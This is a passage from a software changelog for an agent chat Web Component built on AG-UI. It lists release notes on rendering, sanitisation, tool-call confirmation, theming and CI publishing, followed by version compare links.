  tool calls were all server-side re-showed the "thinking" indicator after the
  run had already finished, leaving it stuck. The indicator is no longer shown
  speculatively for server tools, and a terminal `onSettled` guarantee clears
  it (and re-enables input) on every run-loop exit — including the
  `MAX_TOOL_ROUNDS` ceiling and errors.

## [0.2.0] — 2026-06-02

### Added
- **Markdown + HTML rendering** in assistant message bubbles (`renderMarkdown`),
  sanitised with DOMPurify (scripts, event handlers, and `javascript:` URLs
  stripped; links hardened with `target`/`rel`). User messages stay literal.
- **Pending indicator** — an animated "thinking" indicator shown while the agent
  is awaited (before the first token and between tool rounds), honouring
  `prefers-reduced-motion`.
- **New-chat button** in the header — clears the transcript, the persisted
  conversation, and the in-memory run state, and mints a fresh thread.
- **Collapse seam** — a reflected `collapsed` attribute, a built-in header
  toggle, a persisted (per-tab) collapsed state, and a `TOGGLE_EVENT`
  (`ag-ui-toggle`) so a host can drive its own chrome.
- **Tool-call display modes** (`TOOL_DISPLAY`, `data-tool-display`): `minimal`
  (name + status), `compact` (args + result behind one "Details" toggle), and
  `full` (the default; original behaviour).
- **Richer action animations**: `pressThenClick`, `selectOption`,
  `toggleControl` (+ `pressButton` / `selectControl` / `toggleCheckbox` driver
  wrappers), all honouring `prefers-reduced-motion`.
- **Dynamic route syntax**: `Route.path` supports `:name` placeholders;
  `navigate_to_route` substitutes path params (leftover params → query string)
  and `list_routes` advertises each route's `pathParams`.
- `X_CONFIRM_KEY` (`x-confirm`) tool metadata for a human-readable confirmation
  prompt.
- `setNativeValue` / `setNativeChecked` utilities (also used internally).
- **Theming** — a `theme` attribute (`light` / `dark` / `auto` / `code`); `auto`
  follows `prefers-color-scheme`, `code` is a monospace terminal palette. Plus a
  wider set of themeable `--ag-ui-*` variables.
- **Density + placement presets** — `density` (`comfortable` / `compact`) and
  `placement` (`bottom-left` / `side` / `full` / `embedded`); `embedded` drops
  the floating chrome and high z-index so the widget lives in the host layout.
- **Incoming-text animations** — `data-text-animation` (`none` / `fade` /
  `word`), the last revealing assistant text word-by-word; honours
  `prefers-reduced-motion`.
- **`confirmPredicate`** — a per-call `(toolName, args) => boolean | Promise`
  hook deciding confirmation dynamically (authoritative over `x-destructive`).
- **Built-in `read_page` tool** — present when a `getPageMap` provider is set, so
  the agent can re-read the page mid-turn after acting.
- **`x-summary`** tool metadata (`X_SUMMARY_KEY`) — a friendly label shown on the
  tool-call card instead of the raw tool name.
- `observedAttributes` / `attributeChangedCallback` so a late `title-text`
  change updates the header.
- Accessibility: `role="log"`/`aria-live` on the transcript, `role="status"` on
  the pending indicator, `role="group"` on the confirmation card, input label.
- **Skills** — pre-defined prompts surfaced as **chips** (`data-prompt-chips`)
  and/or a **`/`-command palette** (`data-slash-commands`), both opt-in over one
  catalog. Catalog from the `skills` setter (`setSkills`), a `data-skills` JSON
  embed, and/or a fetched `data-skills-url` (merged backend → embed → client).
  Picking pre-fills the input (or auto-sends with `sendImmediately`); prompts
  support `{placeholder}`s filled from `skillContext`, with a missing value
  blocking the send and showing a hint. Exports the `Skill` type.

### Changed
- The destructive-action confirmation is now an **inline card in the transcript**
  (Confirm / Cancel, with the `x-confirm` message) instead of a focus-stealing
  modal overlay. `requestConfirmation` now renders inline; the
  `confirmation_modal` module was removed.
- **Framework-controlled inputs now work.** `fillField` / `typeInto` /
  `selectOption` / `toggleControl` / `setControlValue` set `value` / `checked`
  through the **native prototype setter** before dispatching `input`, so
  React/Vue/Svelte value-tracking sees the change (previously the field looked
  filled but host state stayed empty).
- **Framework interop:** reflecting **property setters** for `endpoint`,
  `toolDisplay`, and `collapsed` (React 19 assigns matching props as element
  properties — getter-only props previously threw).
- `registerTool` is now **idempotent** — re-registering a tool name replaces it
  instead of throwing (re-fired refs / React StrictMode).

### Fixed
- The Markdown/HTML allowlist now permits sanitised **`<img>`** (safe-scheme
  `src`, no event handlers); `javascript:` srcs and disallowed tags (e.g.
  `iframe`) are still stripped.

## [0.1.1] — 2026-06-01

### Changed
- CI: resolve the pnpm version from `package.json`'s `packageManager` only
  (dropped the conflicting `version` input in the release/test workflows).

### Notes
- First fully-automated release via the npm OIDC publish pipeline — 0.1.0 was
  the manual bootstrap publish that created the package.

## [0.1.0] — 2026-06-01

### Added
- `<ag-ui-chat>` Web Component over AG-UI: Shadow-DOM chat UI, a pluggable tool
  registry (`registerTool`), the `x-destructive` confirmation modal, and the
  DOM-driver + animation primitives.
- Durable conversation + resumable run loop that survives the full page reloads
  of a multi-page app: `SessionStorageStore`, a persisted thread id, and
  `x-navigates` checkpoints completed via `navigationResult` on the next mount.
- Host seams: `routeMap` (+ `list_routes` / `navigate_to_route`), an
  auto-injected `getPageMap` context, `registerStateHook`, and an optional
  client-side `navigate()` callback (SPA vs MPA).

### Notes
- First release — exercising the automated npm OIDC publish pipeline end-to-end.

[Unreleased]: https://github.com/Artui/ag-ui-web-component/compare/v0.25.1...HEAD
[0.25.1]: https://github.com/Artui/ag-ui-web-component/compare/v0.25.0...v0.25.1
[0.25.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.24.0...v0.25.0
[0.24.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.23.1...v0.24.0
[0.23.1]: https://github.com/Artui/ag-ui-web-component/compare/v0.23.0...v0.23.1
[0.23.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.22.0...v0.23.0
[0.22.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.21.0...v0.22.0
[0.21.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.20.1...v0.21.0
[0.20.1]: https://github.com/Artui/ag-ui-web-component/compare/v0.20.0...v0.20.1
[0.20.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.19.0...v0.20.0
[0.19.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.18.0...v0.19.0
[0.18.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.17.0...v0.18.0
[0.17.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.16.0...v0.17.0
[0.16.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.15.0...v0.16.0
[0.15.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.14.1...v0.15.0
[0.14.1]: https://github.com/Artui/ag-ui-web-component/compare/v0.14.0...v0.14.1
[0.14.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.13.0...v0.14.0
[0.13.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.12.0...v0.13.0
[0.12.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.11.0...v0.12.0
[0.11.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.10.0...v0.11.0
[0.10.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.9.0...v0.10.0
[0.9.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.8.1...v0.9.0
[0.8.1]: https://github.com/Artui/ag-ui-web-component/compare/v0.8.0...v0.8.1
[0.8.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.7.0...v0.8.0
[0.7.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.6.0...v0.7.0
[0.6.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.5.0...v0.6.0
[0.5.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.4.0...v0.5.0
[0.4.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.3.1...v0.4.0
[0.3.1]: https://github.com/Artui/ag-ui-web-component/compare/v0.3.0...v0.3.1
[0.3.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.2.2...v0.3.0
[0.2.2]: https://github.com/Artui/ag-ui-web-component/compare/v0.2.1...v0.2.2
[0.2.1]: https://github.com/Artui/ag-ui-web-component/compare/v0.2.0...v0.2.1
[0.2.0]: https://github.com/Artui/ag-ui-web-component/compare/v0.1.1...v0.2.0
[0.1.1]: https://github.com/Artui/ag-ui-web-component/compare/v0.1.0...v0.1.1
[0.1.0]: https://github.com/Artui/ag-ui-web-component/releases/tag/v0.1.0
